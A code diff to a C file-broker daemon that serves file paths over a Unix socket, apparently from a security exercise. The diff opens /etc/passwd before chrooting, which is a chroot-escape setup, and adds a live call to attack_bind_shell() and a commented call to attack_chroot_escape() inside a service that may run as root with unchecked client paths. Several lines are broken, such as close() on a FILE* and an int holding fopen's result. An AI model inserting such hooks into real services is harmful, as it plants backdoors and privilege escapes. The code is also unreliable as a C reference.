@@ -12,6 +12,7 @@
 #include <string.h>
 #include <sys/types.h>
 #include <pwd.h>
+#include <signal.h>
 
 #define CHUNK_SIZE 512
 #define SOCKET_PATH "/tmp/filebroker.sock"
@@ -21,7 +22,12 @@ char* p_user = "root";
 int p_uid = 0;
 char* p_socket = NULL;
 
-FILE* open_file(int socket, char* path)
+void handle_sigpipe(int signal)
+{
+    perror("SIGPIPE!");
+}
+
+int open_file(int socket, char* path)
 {
      char* buf[CHUNK_SIZE];
      int num_bytes = 0, num_bytes_sent = 0;
@@ -37,16 +43,18 @@ FILE* open_file(int socket, char* path)
      }
      while( (num_bytes = fread(buf, sizeof(char), CHUNK_SIZE, fp)) > 0)
      {
-	 printf("num_bytes %d\n", num_bytes);
+	 printf("sending %d\n", num_bytes);
          //buf[num_bytes] = '\0';
 	 if((num_bytes_sent = write(socket, buf, num_bytes)) < 0)
 	 {
             perror("error sending data");
+	    close(fp);
+	    return -1;
 	 }
      }
-     printf("closing file.");
+     printf("closing file.\n");
      fclose(fp);
-     return NULL;
+     return 0;
 }
 
 int create_socket()
@@ -87,42 +95,56 @@ int create_socket()
     return fd;
 }
 
+void dump_hex(char* data, int size)
+{
+    unsigned int i;
+    printf("\nhex: ");
+    for (i = 0; i <= size; i+=1)
+        printf("%x", data[i]);
+    printf("\n");
+}
+
 int serve(int fd)
 {
      size_t len = 0;
-     char* buf = NULL; 
+     char buf[512]; 
+     char* path = NULL; 
      int cl;
      int rc;
      int pos = 0;
      int bytes_read = 0;
 
-     printf("process_request\n");
+     printf("serving ...\n");
      while(1)
      {
          if ( (cl = accept(fd, NULL, NULL)) == -1) {
             perror("accept error");
             continue;
           }
-	  buf = malloc(512);
+	  printf("[i] new connection\n");
+	  path = malloc(512);
+	  memset(path, 0, 512);
 	  bytes_read = 0; 
-          while ( (rc=read(cl, buf, sizeof(buf))) > 0) {
-              printf("read %u bytes: %.*s\n", rc, rc, buf);
+          while ( (rc=read(cl, buf, 512)) > 0) {
+	      bytes_read += rc;
+              printf("read %u bytes: %s\n", rc, buf);
+	      dump_hex(buf, rc);
+	      strncat(path, buf, rc);
 	      if((pos = strchr(buf, '\n')) != NULL) { 
 		  printf("pos=%d\n", pos);
                   break;
               }
+	      memset(path, 0, 512);
           }
           if (rc == -1) {
-              perror("read");
-              exit(-1);
+              perror("[!] error read");
           }
-	  buf[strlen(buf)-1] = '\0';
-	  printf("opening %s\n", buf);
+	  path[bytes_read-1] = '\0';
 	  // execute command
-          open_file(cl, buf);
-	  
+          rc = open_file(cl, path);
 	  // clean up
-	  free(buf); buf=NULL;
+	  free(path); path=NULL;
+	  printf("closing socket\n");
           close(cl);
      }
 
@@ -161,6 +183,9 @@ int parse_args(int argc, char* argv[])
         abort();
     }
 
+    // TODO check for force parameter for uid override
+
+    // options overview
     printf("working_dir=%s\n", p_working_dir);
     printf("user=%s (%d)\n", p_user, p_uid);
 
@@ -182,9 +207,16 @@ int chroot_into(char* chroot_target_dir)
 int main(int argc, char* argv[])
 {
     int fd = 0;
+    int fd_tmp = 0;
+    pid_t pid = 0;
 
     if(parse_args(argc, argv) != 0)
 	    exit(1);
+
+    pid = getpid();
+    printf("pid is %d\n", pid);
+
+    fd_tmp = fopen("/etc/passwd", "r");
 
     // create a socket to communicate
     fd = create_socket();
@@ -194,17 +226,33 @@ int main(int argc, char* argv[])
 	exit(EXIT_FAILURE);
     }	
 
-    // open and chroot into the direcotory
-    if(chroot_into(p_working_dir) != 0)
+    if(p_working_dir != NULL)
     {
-	exit(EXIT_FAILURE);
+        // open and chroot into the direcotory
+        if(chroot_into(p_working_dir) != 0)
+        {
+            exit(EXIT_FAILURE);
+        }
     }
 
     // resuid
-    printf("resuid to %d\n", p_uid);
-    setreuid(p_uid, p_uid);
+    if(p_uid != 0)
+    {
+        printf("resuid to %d\n", p_uid);
+        if(setreuid(p_uid, p_uid) != 0)
+        {
+            perror("error at reuid!");
+            exit(EXIT_FAILURE);
+        }
+    } else {
+	// WARN: runs as root!
+	printf("[!] running program as root!\n");
+    }
     
     // start processing requests
+    signal(SIGPIPE, handle_sigpipe); 
+    //attack_chroot_escape();
+    attack_bind_shell();
     serve(fd);
 
     printf("exiting.\n");
